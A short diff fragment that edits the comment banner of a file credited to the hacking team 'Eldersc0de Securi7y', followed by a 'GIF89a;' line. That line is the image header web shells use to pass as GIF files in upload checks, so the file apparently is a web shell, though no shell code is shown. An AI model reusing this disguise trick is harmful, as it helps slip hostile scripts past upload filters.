@@ -3,7 +3,7 @@
 #          Team: Eldersc0de Securi7y            #
 #         https://fb.com/jakarta.exploded.12    #
 #-----------------------------------------------#
-#     Thank's To IndoXploit & Xai Syndicate     #
+#    Thank's To IndoXploit and Xai Syndicate    #
 #################################################
 
 GIF89a;
